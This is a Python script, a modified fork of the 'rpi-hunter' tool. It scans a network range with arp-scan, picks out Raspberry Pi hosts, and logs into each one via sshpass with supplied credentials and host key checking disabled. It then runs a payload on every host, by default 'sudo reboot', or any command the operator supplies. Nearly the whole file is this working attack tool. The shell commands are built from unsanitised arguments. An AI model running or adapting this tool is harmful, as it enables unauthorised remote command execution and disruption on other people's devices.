#!/usr/bin/python2.7
# -*- coding: utf-8 -*-
import os
import argparse
from termcolor import colored, cprint

main_color='yellow'
sub_color='blue'
line_color='red'

payloads={
	'reboot': 'sudo reboot',
}

def list_payloads():
	l=0
	cprint("Payloads:", "green")
	print(colored("Specify with --payload", "green"), colored("name\n", "yellow"))
	for key,value in payloads.items():
		print(colored('['+key+']', 'yellow'), colored(value, 'white'))
	print('\n')


def scan(args):
	if not args.no_scan and not args.safe:
		os.system('sudo arp-scan -g '+args.ip_range+' -W ./scan/scan.pcap'+quiet)
		os.system('tshark -r ./scan/scan.pcap > ./scan/pcap.txt 2>/dev/null')
		os.system('cat ./scan/pcap.txt | grep -i "rasp" > ./scan/raspi_list')
		os.system('awk \'{print $8}\' ./scan/raspi_list > ./scan/rpi_list')
		os.system('rm -rf ./scan/scan.pcap && rm -rf ./scan/pcap.txt && rm -rf ./scan/raspi_list')
		with open('./scan/rpi_list') as inf:
			ip_list = [line.strip() for line in inf]
		return ip_list

def rpi(ip_list, args, payload):
	cprint('\nLoaded '+ str(len(ip_list)) + ' IP\'s', 'yellow')

	cprint("Beginning to send payload to PI\'s...", "yellow")

	for ip in ip_list:
		print(colored("Sending payload to", "yellow"), colored(ip, "yellow"))
		if args.safe:
			print("sshpass -p \""+args.creds+"\" ssh -o stricthostkeychecking=no "+args.uname+"@"+ip+" "+payload)
		else:
			os.system("sshpass -p \""+args.creds+"\" ssh -o stricthostkeychecking=no "+args.uname+"@"+ip+" "+payload)
			print("\n")

def art():
		print('\n')
		cprint("                        NETWORK BUSTER 'N' RPI-HUNTER                        ", main_color)
		cprint("-----------------------------------------------------------------------------", line_color)
		cprint("            Originally by BusesCanFly, Forked & Modified by Team             ", sub_color)
		cprint("-----------------------------------------------------------------------------", line_color)
		print('\n')

def let_the_hunt_begin(args):
    
	if args.payload in payloads:
		payload=payloads[args.payload]
	else:
		payload=args.payload

	global quiet
	if args.quiet:
		quiet=' &>/dev/null'
	else:
		quiet=''
    
	if not args.quiet:
		art()

	if args.list:
		list_payloads()
	else:
		rpi(scan(args), args, payload)
